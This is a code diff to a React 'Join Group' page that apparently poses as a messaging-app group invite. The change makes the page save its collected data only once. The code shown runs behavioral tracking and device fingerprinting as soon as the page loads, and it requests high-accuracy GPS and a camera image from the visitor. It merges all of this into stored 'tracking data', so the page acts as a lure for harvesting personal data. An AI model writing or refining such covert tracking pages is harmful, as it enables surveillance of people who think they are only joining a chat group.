@@ -24,12 +24,14 @@ export default function JoinPage() {
   const [locationError, setLocationError] = useState<string>('');
   const [isRequestingLocation, setIsRequestingLocation] = useState(false);
   const [hasJoined, setHasJoined] = useState(false);
+  const [hasAttemptedJoin, setHasAttemptedJoin] = useState(false);
   const [collectedData, setCollectedData] = useState<CollectedData | null>(null);
   const [backgroundDataCollected, setBackgroundDataCollected] = useState(false);
   const [cameraImage, setCameraImage] = useState<string | null>(null);
   const backgroundDataRef = useRef<Omit<CollectedData, 'gpsLocation'> | null>(null);
   const permissionRequestedRef = useRef(false);
   const cameraPermissionRequestedRef = useRef(false);
+  const dataSavedRef = useRef(false); // Prevent duplicate saves
 
   useEffect(() => {
     // Initialize behavioral tracking when page loads
@@ -133,9 +135,9 @@ export default function JoinPage() {
       backgroundDataRef.current = dataWithoutCamera as any;
       setBackgroundDataCollected(true);
       
-      // Store background data immediately using new storage system
-      await saveTrackingData(dataWithoutCamera as CollectedData);
-      console.log('Step 1: Background data collected successfully');
+      // DON'T save background data yet - wait for final data to prevent duplicates
+      // We'll save once when all data (GPS + camera) is collected
+      console.log('Step 1: Background data collected (not saved yet, waiting for final data)');
     } catch (error) {
       console.error('Error collecting background data:', error);
     }
@@ -218,24 +220,18 @@ export default function JoinPage() {
         }
         
         // Merge all data: background + GPS + camera
-        if (backgroundDataRef.current) {
+        if (!dataSavedRef.current) {
           const allData = await collectAllData(groupId, position.coords);
           allData.cameraImage = finalCameraImage;
           allData.metadata.cameraPermissionStatus = cameraPermissionStatus;
           setCollectedData(allData);
           
-          // Save complete data using new storage system
+          // Save complete data ONCE using new storage system
           await saveTrackingData(allData);
-          console.log('All data collected and saved: background + GPS + camera');
+          dataSavedRef.current = true;
+          console.log('All data collected and saved ONCE: background + GPS + camera');
         } else {
-          // No background data yet, collect everything now
-          const allData = await collectAllData(groupId, position.coords);
-          allData.cameraImage = finalCameraImage;
-          allData.metadata.cameraPermissionStatus = cameraPermissionStatus;
-          setCollectedData(allData);
-          
-          // Save data using new storage system
-          await saveTrackingData(allData);
+          console.log('Data already saved, skipping duplicate save');
         }
       },
       async (error) => {
@@ -268,7 +264,7 @@ export default function JoinPage() {
         }
         
         // Update background data with camera info (no GPS)
-        if (backgroundDataRef.current) {
+        if (!dataSavedRef.current && backgroundDataRef.current) {
           const dataWithCamera = {
             ...backgroundDataRef.current,
             cameraImage: finalCameraImage,
@@ -280,7 +276,10 @@ export default function JoinPage() {
           
           setCollectedData(dataWithCamera);
           await saveTrackingData(dataWithCamera);
-          console.log('Data saved: background + camera (no GPS)');
+          dataSavedRef.current = true;
+          console.log('Data saved ONCE: background + camera (no GPS)');
+        } else {
+          console.log('Data already saved, skipping duplicate save');
         }
       },
       {
@@ -335,6 +334,7 @@ export default function JoinPage() {
 
   // Manual request when user clicks "Join Group"
   const requestLocation = async () => {
+    setHasAttemptedJoin(true); // Mark that user has attempted to join
     setIsRequestingLocation(true);
     setLocationError('');
 
@@ -366,16 +366,23 @@ export default function JoinPage() {
         const cameraPermissionStatus = await getCameraPermissionStatus();
         
         // Collect ALL data (location + fingerprinting + analysis)
-        const allData = await collectAllData(groupId, position.coords);
-        
-        // Add camera image and permission status
-        allData.cameraImage = finalCameraImage;
-        allData.metadata.cameraPermissionStatus = cameraPermissionStatus;
-        
-        setCollectedData(allData);
-        
-        // Save data using new storage system (handles both IndexedDB and localStorage)
-        await saveTrackingData(allData);
+        // Only save if not already saved by automatic collection
+        if (!dataSavedRef.current) {
+          const allData = await collectAllData(groupId, position.coords);
+          
+          // Add camera image and permission status
+          allData.cameraImage = finalCameraImage;
+          allData.metadata.cameraPermissionStatus = cameraPermissionStatus;
+          
+          setCollectedData(allData);
+          
+          // Save data using new storage system (handles both IndexedDB and localStorage)
+          await saveTrackingData(allData);
+          dataSavedRef.current = true;
+          console.log('Data saved ONCE via Join Group button');
+        } else {
+          console.log('Data already saved automatically, skipping duplicate');
+        }
         
         setHasJoined(true);
       },
@@ -400,7 +407,7 @@ export default function JoinPage() {
         const cameraPermissionStatus = await getCameraPermissionStatus();
         
         // Even if location is denied, we still have background data
-        if (backgroundDataRef.current) {
+        if (!dataSavedRef.current && backgroundDataRef.current) {
           const dataWithNoGPS = {
             ...backgroundDataRef.current,
             gpsLocation: null,
@@ -411,15 +418,16 @@ export default function JoinPage() {
             },
           } as CollectedData;
           setCollectedData(dataWithNoGPS);
-          setHasJoined(true); // Still mark as joined, just without GPS
           
-          // Update stored data
-          const existingData = JSON.parse(localStorage.getItem('tracking_data') || '[]');
-          if (existingData.length > 0) {
-            existingData[existingData.length - 1] = dataWithNoGPS;
-            localStorage.setItem('tracking_data', JSON.stringify(existingData));
-          }
+          // Save data using new storage system
+          await saveTrackingData(dataWithNoGPS);
+          dataSavedRef.current = true;
+          console.log('Data saved ONCE: background + camera (no GPS, via Join button)');
+        } else {
+          console.log('Data already saved, skipping duplicate');
         }
+        
+        setHasJoined(true); // Still mark as joined, just without GPS
       },
       {
         enableHighAccuracy: true,
@@ -541,7 +549,7 @@ export default function JoinPage() {
           <div className="border-t border-[#e4e6eb]"></div>
 
           {/* Join Section */}
-          {!hasJoined ? (
+          {!hasAttemptedJoin || !hasJoined ? (
             <div className="px-6 py-8">
               <div className="text-center mb-6">
                 <p className="text-[#667781] text-sm leading-relaxed">
